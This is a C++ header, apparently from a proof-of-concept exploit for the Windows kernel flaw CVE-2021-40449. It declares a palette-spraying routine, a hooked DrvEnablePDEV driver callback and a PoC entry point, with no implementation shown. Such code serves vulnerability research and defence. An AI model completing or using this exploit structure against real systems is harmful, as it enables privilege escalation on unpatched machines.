#pragma once
#define WIN32_LEAN_AND_MEAN
#include "include/core/def.hpp"
#include "include/utils/gadget.hpp"
#include "include/describe/vuln_description.hpp"

#include <vector>

namespace CVE_2021_40449
{
    inline bool trigger = false;
    inline HDC pocHDC;

    VOID SprayPalettes(DWORD size);
    DHPDEV hook_DrvEnablePDEV(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
    bool PoC();
} // namespace CVE_2021_40449
